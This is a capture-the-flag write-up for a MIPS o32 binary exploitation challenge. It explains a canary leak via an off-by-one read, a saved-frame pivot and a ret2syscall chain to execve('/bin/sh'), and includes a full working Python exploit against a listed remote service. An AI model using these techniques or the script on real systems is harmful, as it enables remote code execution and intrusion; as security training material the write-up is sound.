---
title: "PWN#Beta"
category: "Pwn"
tags: ["mips", "o32", "off-by-one", "canary-leak", "stack-overflow", "ret2syscall", "static-binary"]
solve_date: "2026-10-14T18:00:00+07:00"
language: "en"
points: 192
---

# PWN#Beta — MIPS o32 canary leak into a read() frame clobber

**Writeup local — Le_Geek.**

**Flag:** `CTF{9d1468794bdeef6cc5325201ef334c89}`  
**Service:** `nc 169.58.126.107 5005`  
**Flag format:** `CTF{}`

| Artifact | Bytes | SHA-256 |
|---|---:|---|
| `vault` (ELF32 MIPS32 rel2, static, stripped) | 630,556 | `4d51fecb9e1b38daaba1cbbb03688f6c6ac81e660e7cd02f0ee04c053e3741a0` |

## Challenge

> PWN#Beta — 192 points. Get a shell on the remote host and read the flag.

The handout is a 32-bit little-endian MIPS (o32) `vault` binary. The service prints
`Enter your name: `, greets the name back with `printf("Hello, %s", buf)`, prints
`Leave a message for the vault keeper: `, reads a second buffer and answers
`Message received.` before looping. The flag lives in `/flag/flag.txt` on the host.

## Analysis

### The binary

`vault` is `ELF 32-bit LSB executable, MIPS, MIPS32 rel2`, statically linked, stripped, type `EXEC`
(no PIE, image at `0x400000`), entry `0x401140`. `GNU_STACK` is `RW`, so the stack is NX. The
canary is a 4-byte guard read through `gp-0x7fe0` and stored at `fp+0x5c`.

The attachment cannot be executed locally, which is why every address below was measured on the
live service instead of under `qemu-mipsel`. The entry point is a self-decrypting stub:

```text
0x401140  lui   $t1, 0x4a
0x401144  addiu $t1, $t1, 0x300
0x401148  lw    $t0, ($t1)          ; file value 0x8ac3f100
0x40114c  lui   $t2, 0x426f
0x401150  ori   $t2, $t2, 0x6772
0x401154  xor   $t3, $t0, $t2       ; 0x8ac3f100 ^ 0x426f6772 = 0xc8ac9672
0x401158  jr    $t3
```

`0xc8ac9672` is unmapped, so `qemu-mipsel-static ./vault` dies on the first basic block. The
strings the program prints are likewise XOR-encrypted in `.data` and only exist in cleartext after
the stub has run.

### The vulnerable function

Both reads go to the same 64-byte stack buffer at `fp+0x1c`:

```text
0x400a90  addiu $sp, $sp, -0x68
0x400a9c  move  $fp, $sp
0x400aa0  sw    $gp, 0x10($sp)              ; $gp saved at fp+0x10
0x400ac8  bal   0x409590                    ; printf("Enter your name: ")
0x400ad0  lw    $gp, 0x10($fp)
0x400ad8  addiu $a2, $zero, 0x41            ; 65 bytes
0x400ae4  read(0, fp+0x1c, 0x41)            ; buf = fp+0x1c, size 64
0x400af8  addiu $v0, $fp, 0x1c
0x400b10  bal   0x409590                    ; printf("Hello, %s", buf)  -- no width, no NUL added
0x400b18  printf("\nLeave a message for the vault keeper: ")
0x400b3c  lw    $gp, 0x10($fp)
0x400b44  addiu $a2, $zero, 0x64            ; 100 bytes
0x400b50  read(0, fp+0x1c, 0x64)
0x400b60  puts("Message received.")
0x400b84  lw    $v0, -0x7fe0($gp)           ; canary check
0x400b88  lw    $v1, 0x5c($fp)
0x400b90  beq   $v1, $v0, 0x400ba8
0x400ba8  move  $sp, $fp ; lw $ra,0x64($sp) ; lw $fp,0x60($sp) ; addiu $sp,0x68 ; jr $ra
```

The name read is one byte longer than the buffer. The message read is 36 bytes longer than the
buffer, so the canary has to be preserved — but the epilogue reloads `$fp` from the frame, which
means the pivot target is attacker-controlled as well.

### Frame layout

| Offset | Contents |
|---|---|
| `buf+0x00` .. `buf+0x3f` | 64-byte buffer, shared by name and message |
| `buf+0x40` .. `buf+0x43` | stack canary |
| `buf+0x44` .. `buf+0x47` | saved `$fp` |
| `buf+0x48` .. `buf+0x4b` | saved `$ra` |
| `buf+0x4c` | `$sp` after the epilogue (`fp` was `buf-0x1c`) |

### Leak: overwriting the canary's NUL

The canary's low byte is `0x00`, so a 64-byte name would stop `%s` exactly at the canary. Sending
65 bytes puts the trailing `\n` (`0x0a`) on top of that `0x00`, and `printf` keeps walking the
stack: 3 remaining canary bytes, the saved `$fp`, then 3 bytes of the saved `$ra` until the `0x00`
in `0x00400c28` ends the string. The reply therefore carries exactly 10 bytes of stack data past
the `A` run (a 300-byte name probe, so the 65th byte is `A` and not the newline):

```text
300B resp: b'Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xfc\xad\xc58\x0c\x80@(\x0c@\nLeave a message for the vault keeper:' len 139
```

so `canary = 00 || bytes[0:3]`, `main_fp = bytes[3:7]`, `saved_ra = bytes[7:10] || 00`, and
`buf = main_fp - 0x4c`. On the remote this is stable across connections:

```text
leak: canary=0060ec55 main_fp=0x40800c38 saved_ra=0x400c28 buf=0x40800bec
```

The canary itself changes per connection, the stack addresses do not.

### Runtime address shifts

Three regions behave differently from the handout's VAs, all measured with an arbitrary-read
primitive built from the same bug:

* Application code `0x4002c0` .. `0x400ba8`, and the bare `syscall` at `0x400394`, run at exactly
  the file VAs.
* The statically linked libc runs `0x480` lower: `puts` `0x40ff60 -> 0x40fae0`, `printf`
  `0x409590 -> 0x409110`, `read` `0x427770 -> 0x4272f0`, `__stack_chk_fail` `0x42b7f0 -> 0x42b370`.
* The application's `$gp` is `0x4a9370` (the file's nominal `0x4a9c60` faults), i.e. `.data` is
  `0x8f0` lower.

That is why the 3-argument gadget below is called at `0x433328` although it is listed at
`0x4337a8`, and why payload 1 has to plant `0x4a9370` in the `$gp` slot.

### Bisecting the geometry

Two things had to be pinned down empirically, because the binary cannot be run locally:

* **Frame offsets.** A ladder of payloads (`chainbisect.py`) sent `$ra` to gadget 1 only, then
  gadget 1 -> gadget 2 -> `main`, then the full 3-gadget `call1`, and finally `call1` with
  `$a0 = buf+2` pointing at a marker string. Only the last one printed the marker, which fixed
  canary `= buf+0x40`, saved `$fp` `= buf+0x44`, saved `$ra` `= buf+0x48`.
* **The libc shift.** The same marker test was run with the argument gadget at `file+0`,
  `file-0x480` and `file-0x8f0`. Only `-0x480` produced the extra `Message received.` marker; the
  other two died silently, which looks identical to "the address is dead" and cost several rounds.

An earlier "runtime base `0x0a400000`" theory was an artefact of the reader miscounting the
format's own newline as a data byte; once that was fixed, all addresses collapsed to the model
above. A `system`-like function at file `0x408b80` was also tried and never reachable.

## Solution

### 1. Leak canary, `$fp` and `buf`

Send `b'A'*64 + b'\n'`, parse `Hello, ` up to the newline, then take 10 bytes. Rebuild the canary
with its known `0x00` low byte, derive `buf = main_fp - 0x4c`, and keep the socket open: the canary
is only valid for this one connection.

### 2. Payload 1 — steer the epilogue into the second read

The message read accepts 100 bytes, so the canary, `$fp` and `$ra` are all writable:

```text
buf+0x24  0x4a9370     the $gp value the resumed code will load from *(fp+0x10)
buf+0x40  canary
buf+0x44  buf+0x14     saved $fp
buf+0x48  0x400b3c     saved $ra
```

`0x400b3c` is `lw $gp,0x10($fp) ; read(0, $fp+0x1c, 100)`. With `$fp = buf+0x14` the `$gp` load
hits our planted word at `buf+0x24` and the read lands at `buf+0x30`.

### 3. Payload 2 — read() overwrites its own frame

At `0x400b50` the stack pointer is `buf+0x4c`, so `read()`'s 0x18-byte frame covers
`buf+0x34` .. `buf+0x4b`, with `$s0/$s1/$s2/$ra` at `buf+0x3c/0x40/0x44/0x48`. The destination
`buf+0x30` overlaps that frame: the 100 bytes we send are written over the saved registers that
`read()` is about to pop. When it returns it loads our `$ra` and continues with `$sp = buf+0x4c`,
never reaching the canary check at `0x400b7c`.

```text
buf+0x30  "/bin/sh\0"        <- also $a0 later
buf+0x3c  buf+0x30, 0        <- argv = ["/bin/sh", NULL]
buf+0x48  0x433328           <- read()'s $ra = argument gadget
```

### 4. Argument gadget -> bare syscall

The gadget at file `0x4337a8` (runtime `0x433328`) builds a full syscall frame from `$sp`:

```text
0x4337a8  lw   $v0, 0x44($sp)
0x4337ac  lw   $a2, 0x38($sp)
0x4337b0  lw   $a1, 0x3c($sp)
0x4337b4  lw   $a0, 0x40($sp)
0x4337b8  lw   $t9, 0x28($sp)
0x4337c8  jalr $t9
```

Payload 2 fills `$v0 = 4011` (o32 `__NR_execve`), `$a0 = buf+0x30`, `$a1 = buf+0x3c`,
`$a2 = 0`, and `$t9 = 0x400394` — a bare `syscall` instruction inside the application region, so it
needs no libc shift.

### 5. Shell

`execve("/bin/sh", ["/bin/sh", NULL], NULL)` runs as root in the container. `/flag` is a directory
and the flag is `/flag/flag.txt`.

## Exploit code

Self-contained version of the final script (`pwn_final.py` leak helpers + `exp13.py` +
`getflag.py`, logic unchanged).

```python
#!/usr/bin/env python3
# PWN#Beta - MIPS o32 static, NX stack, 4-byte canary, non-PIE at 0x400000.
# 1) 65-byte name read overwrites the canary's NUL -> printf("Hello, %s") leaks
#    canary[1..3], saved $fp and saved $ra.
# 2) 100-byte message read: $fp = buf+0x14, $ra = 0x400b3c, gp cell at buf+0x24.
#    The resumed code does lw $gp,0x10($fp) then read(0, $fp+0x1c, 100) -> buf+0x30.
# 3) That read lands on read()'s own saved registers, so its epilogue returns into
#    the argument gadget 0x433328 -> bare syscall at 0x400394 -> execve("/bin/sh").
import socket, struct, time

HOST, PORT = '169.58.126.107', 5005

SITE2   = 0x400B3C            # lw $gp,0x10($fp); read(0, $fp+0x1c, 100)
SYSCALL = 0x400394            # bare `syscall` (app region, delta 0)
GAD     = (0x4337A8 - 0x480)  # lw $v0,0x44(sp); $a2,0x38; $a1,0x3c; $a0,0x40; $t9,0x28; jalr $t9
GP_R    = 0x4A9370            # $gp value the remote application actually uses
WRITE, READ_S, OPEN, EXECVE = 4004, 4003, 4005, 4011

# geometry: F1 = buf+0x14  ->  read lands at W = buf+0x30
# read epilogue: $sp = buf+0x4c; slots inside p2 (index = abs - 0x30)
IDX_S0, IDX_S1, IDX_S2, IDX_RA = 0x3c - 0x30, 0x40 - 0x30, 0x44 - 0x30, 0x48 - 0x30
# GAD frame, $sp = buf+0x4c:
I_T9 = 0x28 + 0x4c - 0x30
I_A2 = 0x38 + 0x4c - 0x30
I_A1 = 0x3c + 0x4c - 0x30
I_A0 = 0x40 + 0x4c - 0x30
I_V0 = 0x44 + 0x4c - 0x30
STR, ARGV = 0, 12          # p2 indices for "/bin/sh" and argv array


def conn():
    s = socket.create_connection((HOST, PORT), 15)
    s.settimeout(4)
    return s


def drain(s, t=0.5, extra=0.35):
    time.sleep(t)
    out = b''
    s.settimeout(extra)
    while True:
        try:
            r = s.recv(4096)
        except Exception:
            break
        if not r:
            break
        out += r
    return out


def leak():
    """return (sock, canary4, main_fp, buf_abs, junk_after_prompt)"""
    last = None
    for _ in range(8):
        try:
            s = conn()
        except Exception as e:
            last = e; time.sleep(1); continue
        head = drain(s, 0.35)
        if b'name' not in head.lower():
            s.close(); continue
        s.sendall(b'A' * 64 + b'\n')
        d = drain(s, 0.5)
        i = d.find(b'Hello, ')
        if i < 0:
            s.close(); continue
        b = d[i + 7:]
        n = 0
        while n < len(b) and b[n:n + 1] == b'A':
            n += 1
        if b[n:n + 1] == b'\n':
            n += 1
        lk = b[n:]
        if len(lk) < 10:
            s.close(); continue
        canary = b'\x00' + lk[0:3]
        mf = struct.unpack('<I', lk[3:7])[0]
        ra = struct.unpack('<I', lk[7:10] + b'\x00')[0]
        buf = (mf - 0x4c) & 0xFFFFFFFF
        print('  leak: canary=%s main_fp=%#x saved_ra=%#x buf=%#x' % (canary.hex(), mf, ra, buf))
        return s, canary, mf, buf, lk[10:]
    raise RuntimeError('leak failed: %r' % (last,))


def build(buf, ck, v0, a0, a1, a2, extra=None):
    p1 = bytearray(100)
    p1[64:68] = ck
    struct.pack_into('<I', p1, 68, buf + 0x14)      # $fp = F1
    struct.pack_into('<I', p1, 72, SITE2)           # $ra = read site
    struct.pack_into('<I', p1, 0x24, GP_R)          # *(F1+0x10) = valid gp
    p2 = bytearray(100)
    struct.pack_into('<I', p2, IDX_RA, GAD)         # read returns -> arg gadget
    struct.pack_into('<I', p2, I_T9, SYSCALL)
    struct.pack_into('<I', p2, I_A2, a2)
    struct.pack_into('<I', p2, I_A1, a1)
    struct.pack_into('<I', p2, I_A0, a0)
    struct.pack_into('<I', p2, I_V0, v0)
    p2[STR:STR + 8] = b'/bin/sh\x00'
    struct.pack_into('<I', p2, ARGV, buf + 0x30 + STR)
    struct.pack_into('<I', p2, ARGV + 4, 0)
    for off, val in (extra or {}).items():
        p2[off:off + len(val)] = val
    return bytes(p1), bytes(p2)


def run(label, v0, a0, a1, a2, follow=(), total=6.0):
    s, ck, mf, buf, _ = leak()
    p1, p2 = build(buf, ck, v0, a0, a1, a2)
    s.sendall(p1)
    time.sleep(0.3)
    o = drain(s, 0.4)
    t0 = time.time()
    s.sendall(p2)
    s.settimeout(1.0)
    while time.time() - t0 < total:
        try:
            r = s.recv(4096)
        except Exception:
            continue
        if r == b'':
            o += b'<EOF>'
            break
        o += r
    for f in follow:
        try:
            s.sendall(f.encode() if isinstance(f, str) else f)
        except Exception:
            o += b'<DEAD>'
            break
        try:
            o += s.recv(4096)
        except Exception:
            pass
    print('%-30s dt=%4.1f -> %r' % (label, time.time() - t0, o[-150:]))
    try:
        s.close()
    except Exception:
        pass
    return o


if __name__ == '__main__':
    B = 0x40800bec          # stable leaked buf on this target
    W = B + 0x30
    run('FLAG', EXECVE, W + STR, W + ARGV, 0,
        follow=['cat /flag/flag.txt\n', 'echo DONE\n'])
```

## Result

Root shell reached; `/flag` is a directory containing `flag.txt` (38 bytes):

```text
FLAG                           dt= 7.4 -> b'total 680\ndrwxr-xr-x 1 root root   4096 Oct 14 00:11 .\n...'
FLAG                           dt= 8.4 -> b'60 Oct 14 00:11 .\ndrwxr-xr-x 1 root root 4096 Oct 14 00:11 ..\n-r--r--r-- 1 root root   38 Oct 14 00:11 flag.txt\n/proc/kpageflags\n/flag\n/flag/flag.txt\n'
```

The first line is cut at `...`; the full listing continues with `..` and
`-r-xr-xr-x 1 root root 683848 Oct 13 18:42 vault`.

Final run, reproduced on a second fresh connection with the same output:

```text
FLAG                           dt= 6.5 -> b'Message received.\nCTF{9d1468794bdeef6cc5325201ef334c89}\nDONE\n'
FLAG                           dt= 6.6 -> b'Message received.\nCTF{9d1468794bdeef6cc5325201ef334c89}\nDONE\n'
```

The leading `Message received.` is `vuln()`'s own `puts` from the first payload; everything after it
is the shell.

## Notes

* The whole leak is the 65-byte name read. If canary bytes 1–3 contain `0x00` the string stops
  early, fewer than 10 bytes arrive, and the script reconnects for a fresh canary. That retry loop
  is required, not cosmetic.
* The stack addresses are fixed (`buf = 0x40800bec`, `main_fp = 0x40800c38`) but the canary is per
  connection, so payload 1 and payload 2 must go to the same socket, 0.3 s apart.
* `$gp` must be planted at `fp+0x10` for every fake frame. The resumed code does
  `lw $gp,0x10($fp)` and then dereferences `gp-0x7f7c` to find `read`; with a garbage `$gp` the
  process dies right after printing the first `Message received.`, which is easy to mistake for a
  wrong gadget address.
* The libc blob is `0x480` below its file VAs and `.data` is `0x8f0` below. Calling `puts`/`printf`
  at the file address, or `system` at `0x408b80`, fails silently. Verify any libc-side address with
  a printing marker (`0x400b60` puts-site) before trusting it.
* The attachment is not runnable locally: the entry stub XORs `[0x4a0300]` with `0x426f6772` and
  jumps to `0xc8ac9672`. Every offset here was confirmed against the live service.
* The message read is capped at 100 bytes (`$a2 = 0x64`) and payload 2 has to use all of them: the
  gadget's `$v0` slot is `0x44($sp)` = `buf+0x90`, the last word the read can reach. One byte short
  and `execve` is called with a stale syscall number.
